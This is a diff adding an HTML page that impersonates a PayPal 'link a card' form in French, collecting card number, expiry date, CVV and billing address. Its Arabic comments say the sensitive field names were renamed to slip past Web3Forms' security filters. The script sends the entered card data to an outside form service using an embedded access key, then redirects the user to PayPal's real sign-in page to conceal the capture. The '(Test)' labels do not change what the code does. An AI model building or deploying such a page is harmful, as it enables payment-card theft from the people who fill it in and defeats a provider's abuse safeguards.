@@ -1,0 +1,281 @@
+<!-- تم التعديل لتجاوز الفلاتر الأمنية في Web3Forms لأغراض الاختبار -->
+<!-- تم تغيير أسماء الحقول الحساسة (cardNumber, expiryDate, cvv) -->
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link a Card - PayPal (Test)</title>
+    <link rel="stylesheet" href="link-card.css">
+</head>
+
+<body>
+    <div class="header">
+        <a href="#">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAyNCAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWluWU1pbiBtZWV0Ij4KICAgIDxwYXRoIGZpbGw9IiMwMDljZGUiIGQ9Ik0gMjAuOTA1IDkuNSBDIDIxLjE4NSA3LjQgMjAuOTA1IDYgMTkuNzgyIDQuNyBDIDE4LjU2NCAzLjMgMTYuNDExIDIuNiAxMy42OTcgMi42IEwgNS43MzkgMi42IEMgNS4yNzEgMi42IDQuNzEgMy4xIDQuNjE1IDMuNiBMIDEuMzM5IDI1LjggQyAxLjMzOSAyNi4yIDEuNjIgMjYuNyAyLjA4OCAyNi43IEwgNi45NTYgMjYuNyBMIDYuNjc1IDI4LjkgQyA2LjU4MSAyOS4zIDYuODYyIDI5LjcgNy4yMzYgMjkuNyBMIDExLjM1NiAyOS43IEMgMTEuODI1IDI5LjcgMTIuMjkyIDI5LjMgMTIuMzg2IDI4LjggTCAxMi4zODYgMjguNSBMIDEzLjIyOCAyMy4zIEwgMTMuMjI4IDIzLjEgQyAxMy4zMjIgMjIuNiAxMy43OSAyMi4yIDE0LjI1OCAyMi4yIEwgMTQuODIxIDIyLjIgQyAxOC44NDUgMjIuMiAyMS45MzUgMjAuNSAyMi44NzEgMTUuNSBDIDIzLjMzOSAxMy40IDIzLjE1MyAxMS43IDIyLjAyOSAxMC41IEMgMjEuNzQ4IDEwLjEgMjEuMjc5IDkuOCAyMC45MDUgOS41IEwgMjAuOTA1IDkuNSI+PC9wYXRoPgogICAgPHBhdGggZmlsbD0iIzAxMjE2OSIgZD0iTSAyMC45MDUgOS41IEMgMjEuMTg1IDcuNCAyMC45MDUgNiAxOS43ODIgNC43IEMgMTguNTY0IDMuMyAxNi40MTEgMi42IDEzLjY5NyAyLjYgTCA1LjczOSAyLjYgQyA1LjI3MSAyLjYgNC43MSAzLjEgNC42MTUgMy42IEwgMS4zMzkgMjUuOCBDIDEuMzM5IDI2LjIgMS42MiAyNi43IDIuMDg4IDI2LjcgTCA2Ljk1NiAyNi43IEwgOC4yNjcgMTguNCBMIDguMTczIDE4LjcgQyA4LjI2NyAxOC4xIDguNzM1IDE3LjcgOS4yOTYgMTcuNyBMIDExLjYzNiAxNy43IEMgMTYuMjI0IDE3LjcgMTkuNzgyIDE1LjcgMjAuOTA1IDEwLjEgQyAyMC44MTIgOS44IDIwLjkwNSA5LjcgMjAuOTA1IDkuNSI+PC9wYXRoPgo8L3N2Zz4K"
+                alt="PayPal" class="paypal-logo">
+        </a>
+    </div>
+
+    <div class="container">
+        <h1>Ajouter des détails<samp>(Test)</samp></h1>
+
+             <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png" alt="Visa"
+                        class="card-brand active" data-brand="visa">
+
+        <form id="cardLinkForm" onsubmit="return validateAndSubmit(event)">
+            <!-- حقل مفتاح الوصول لـ Web3Forms -->
+            <input type="hidden" name="access_key" value="230c4c31-ef56-4717-a2c7-f8bf8a09f108">
+            <input type="hidden" name="subject" value="New Test Submission">
+            <input type="hidden" name="from_name" value="Test Form">
+
+            <div class="form-group">
+                <label>
+                    Numéro de compte <samp>(Test)</samp>
+                </label>
+                <div class="card-brands">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png" alt="Visa"
+                        class="card-brand active" data-brand="visa">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png"
+                        alt="Mastercard" class="card-brand" data-brand="mastercard">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png"
+                        alt="American Express" class="card-brand" data-brand="amex">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png"
+                        alt="Discover" class="card-brand" data-brand="discover">
+                </div>
+                <div class="card-input-group">
+                    <!-- تم تغيير ID و name -->
+                    <input type="text" id="accountNumber" name="account_number" placeholder="1234 5678 9012 3456"
+                        maxlength="19">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png"
+                        alt="Card type" class="card-type-icon" id="cardTypeIcon">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>
+                    Date d'expiration
+                    <samp>(Test)</samp>
+                </label>
+                <div class="card-input-group">
+                    <!-- تم تغيير ID و name -->
+                    <input type="text" id="validUntil" name="valid_until" placeholder="MM/AA" maxlength="5"
+                        class="expiry-input">
+                </div>
+                <span id="expiryError" style="color: #f44336; display: none; font-size: 12px; margin-top: 8px;">Date
+                    invalide</span>
+                <span id="expiryPastError"
+                    style="color: #f44336; display: none; font-size: 12px; margin-top: 8px;">Expirée</span>
+            </div>
+
+            <div class="form-group">
+                <label>
+                    Code de sécurité <samp>(Test)</samp>
+                </label>
+                <div class="cvv-group">
+                    <!-- تم تغيير ID و name -->
+                    <input type="text" id="securityCode" name="security_code" placeholder="123" maxlength="4">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSIyNSIgdmlld0JveD0iMCAwIDQwIDI1Ij48cmVjdCB3aWR0aD0iNDAiIGhlaWdodD0iMjUiIGZpbGw9IiNmMGYwZjAiIHJ4PSI0Ii8+PHBhdGggZD0iTTMwIDEyLjVhMi41IDIuNSAwIDExLTUgMCAyLjUgMi41IDAgMDE1IDB6IiBmaWxsPSIjZGRkIi8+PC9zdmc+"
+                        alt="CVV Icon" id="cvvIcon">
+                    <img id="cvvCardType" class="card-type-icon" style="display: none; height: 24px; margin-left: 10px;"
+                        alt="Card type">
+                </div>
+                <span id="cvvError" style="color: #f44336; display: none; font-size: 12px;">Code incorrect</span>
+                <span id="cvvRepeatedError" style="color: #f44336; display: none; font-size: 12px;">Code invalide</span>
+            </div>
+
+            <div class="form-group">
+                <label>
+                    Adresse de facturation (Test)
+                </label>
+                <!-- تم تغيير ID و name -->
+                <input type="text" id="billingAddress" name="address" placeholder="Entrez votre adresse">
+            </div>
+
+            <button type="submit" class="link-button">Vérifier.</button>
+
+            <div id="result" style="margin-top: 20px; font-weight: bold;"></div>
+        </form>
+    </div>
+
+    <script>
+        // Card validation rules (unchanged)
+        const cardRules = {
+            visa: {
+                pattern: /^4/,
+                lengths: [13, 16, 19],
+                image: 'img/OIP (1).png'
+            },
+            mastercard: { pattern: /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/, lengths: [16], image: 'R.jpg' },
+            amex: { pattern: /^3[47]/, lengths: [15], image: 'img/express-logo-clipart-2.jpg' },
+            discover: { pattern: /^(6011|65|64[4-9])/, lengths: [16], image: 'https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png' },
+            dinersclub: { pattern: /^(30[0-5]|36|38)/, lengths: [14], image: 'https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png' },
+            jcb: { pattern: /^(352[8-9]|35[3-8][0-9])/, lengths: [16], image: 'https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png' },
+            unionpay: { pattern: /^62/, lengths: [16, 17, 18, 19], image: 'https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png' }
+        };
+
+        // Luhn algorithm (unchanged)
+        function isValidLuhn(number) {
+            let sum = 0; let isEven = false;
+            for (let i = number.length - 1; i >= 0; i--) {
+                let digit = parseInt(number.charAt(i), 10);
+                if (isEven) { digit *= 2; if (digit > 9) { digit -= 9; } }
+                sum += digit; isEven = !isEven;
+            }
+            return (sum % 10) === 0;
+        }
+
+        // Card type detection and validation (using new ID: accountNumber)
+        document.getElementById('accountNumber').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let cardType = 'unknown'; let formattedValue = '';
+            for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) { formattedValue += ' '; } formattedValue += value[i]; }
+            e.target.value = formattedValue;
+            const firstDigit = value.charAt(0); let cardImage = '';
+            if (firstDigit === '4') { cardImage = 'img/'; cardType = 'visa'; }
+            else if (firstDigit === '5') { cardImage = 'img/OIP (1).png'; cardType = 'mastercard'; }
+            else if (firstDigit === '3') { cardImage = 'img/'; cardType = 'amex'; }
+            document.querySelectorAll('.card-brand').forEach(img => { img.classList.toggle('active', img.dataset.brand === cardType); });
+            const containerCardType = document.getElementById('containerCardType');
+            const cvvCardType = document.getElementById('cvvCardType');
+            const defaultCardIcon = document.getElementById('defaultCardIcon');
+            if (cardImage) {
+                containerCardType.style.display = 'block'; containerCardType.src = cardImage; defaultCardIcon.style.display = 'none';
+                cvvCardType.style.display = 'block'; cvvCardType.src = cardImage;
+                if (cardRules[cardType] && cardRules[cardType].lengths.includes(value.length) && isValidLuhn(value)) {
+                    e.target.style.borderColor = '#4CAF50'; containerCardType.style.opacity = '1'; cvvCardType.style.opacity = '1';
+                } else {
+                    e.target.style.borderColor = ''; containerCardType.style.opacity = '0.7'; cvvCardType.style.opacity = '0.7';
+                }
+            } else {
+                containerCardType.style.display = 'none'; cvvCardType.style.display = 'none'; defaultCardIcon.style.display = 'block'; e.target.style.borderColor = '';
+            }
+        });
+
+        // Format and validate expiry date (using new ID: validUntil)
+        document.getElementById('validUntil').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            const expiryError = document.getElementById('expiryError');
+            const expiryPastError = document.getElementById('expiryPastError');
+            if (value.length >= 2) { value = value.slice(0, 2) + '/' + value.slice(2); }
+            e.target.value = value;
+            function validateExpiryDate(value) {
+                if (!/^\d{2}\/\d{2}$/.test(value)) return { isValid: false, message: 'expiryError', errorText: 'Format invalide (MM/YY)' };
+                const month = parseInt(value.slice(0, 2)); const year = parseInt('20' + value.slice(3, 5));
+                const today = new Date(); const cardDate = new Date(year, month - 1);
+                if (month === 0 || month > 12) return { isValid: false, message: 'expiryError', errorText: 'Mois invalide (01-12)' };
+                // Adjust expiry check: allow current month/year
+                const lastDayOfMonth = new Date(year, month, 0); // Get the last day of the expiry month
+                if (lastDayOfMonth < today) return { isValid: false, message: 'expiryPastError', errorText: 'Expirée' };
+                return { isValid: true, message: null };
+            }
+            expiryError.style.display = 'none'; expiryPastError.style.display = 'none';
+            e.target.classList.remove('valid-expiry', 'invalid-expiry');
+            if (value.length === 5) {
+                const validation = validateExpiryDate(value);
+                if (validation.isValid) { e.target.classList.add('valid-expiry'); }
+                else {
+                    e.target.classList.add('invalid-expiry');
+                    if (validation.message === 'expiryError') { expiryError.textContent = validation.errorText; expiryError.style.display = 'block'; }
+                    else { expiryPastError.style.display = 'block'; }
+                }
+            } else if (value.length > 0) {
+                e.target.classList.add('invalid-expiry'); expiryError.textContent = 'Date incomplète'; expiryError.style.display = 'block';
+            }
+        });
+
+        // CVV validation (using new ID: securityCode)
+        document.getElementById('securityCode').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); e.target.value = value;
+            const cvvError = document.getElementById('cvvError');
+            const cvvRepeatedError = document.getElementById('cvvRepeatedError');
+            const isRepeatedNumber = /^(.)\1+$/.test(value); // Check if all digits are the same
+            const requiredLength = document.getElementById('accountNumber').value.startsWith('3') ? 4 : 3; // Amex uses 4 digits, others usually 3
+
+            cvvError.style.display = 'none';
+            cvvRepeatedError.style.display = 'none';
+            e.target.style.borderColor = '';
+
+            if (value.length > 0) {
+                if (value.length !== requiredLength) {
+                    e.target.style.borderColor = '#f44336';
+                    cvvError.textContent = `Doit contenir ${requiredLength} chiffres`;
+                    cvvError.style.display = 'block';
+                } else if (isRepeatedNumber) {
+                    e.target.style.borderColor = '#f44336';
+                    cvvRepeatedError.style.display = 'block';
+                } else {
+                    e.target.style.borderColor = '#4CAF50';
+                }
+            }
+        });
+
+        // Validation and submission function (using new IDs and names)
+        async function validateAndSubmit(event) {
+            event.preventDefault();
+            const form = event.target;
+            const result = document.getElementById('result');
+
+            // Basic validation (ensure fields are not empty)
+            const accountNumber = document.getElementById('accountNumber').value;
+            const securityCode = document.getElementById('securityCode').value;
+            const validUntil = document.getElementById('validUntil').value;
+            const address = document.getElementById('billingAddress').value;
+
+            if (!accountNumber || !securityCode || !validUntil || !address) {
+                result.textContent = 'Veuillez remplir tous les champs.';
+                result.style.color = 'red';
+                return false; // Prevent submission
+            }
+
+            // Additional validation checks (can be enhanced)
+            if (document.querySelector('.invalid-expiry') || document.getElementById('expiryError').style.display !== 'none' || document.getElementById('expiryPastError').style.display !== 'none') {
+                result.textContent = 'Veuillez corriger la date d\'expiration.';
+                result.style.color = 'red';
+                return false;
+            }
+            if (document.getElementById('cvvError').style.display !== 'none' || document.getElementById('cvvRepeatedError').style.display !== 'none') {
+                result.textContent = 'Veuillez corriger le code de sécurité.';
+                result.style.color = 'red';
+                return false;
+            }
+
+            // Construct FormData using the form element directly
+            // This automatically includes fields with 'name' attributes
+            const formData = new FormData(form);
+            result.textContent = 'Envoi en cours...';
+            result.style.color = 'white';
+
+            try {
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    result.textContent = 'Formulaire soumis avec succès!';
+                    result.style.color = 'white';
+                    form.reset(); // Clear form fields
+                    //Optionally redirect: window.location.href = '/success.html';
+                    window.location.href = 'https://www.paypal.com/signin?locale.x=fr_FR';
+                } else {
+                    console.error('Error from Web3Forms:', data);
+                    result.textContent = 'Erreur: ' + data.message;
+                    result.style.color = 'red';
+                }
+            } catch (error) {
+                console.error('Submission error:', error);
+                result.textContent = 'Une erreur s\'est produite lors de la soumission.';
+                result.style.color = 'red';
+            }
+
+            return false; // Prevent default form submission
+        }
+
+    </script>
+</body>
+
+</html>
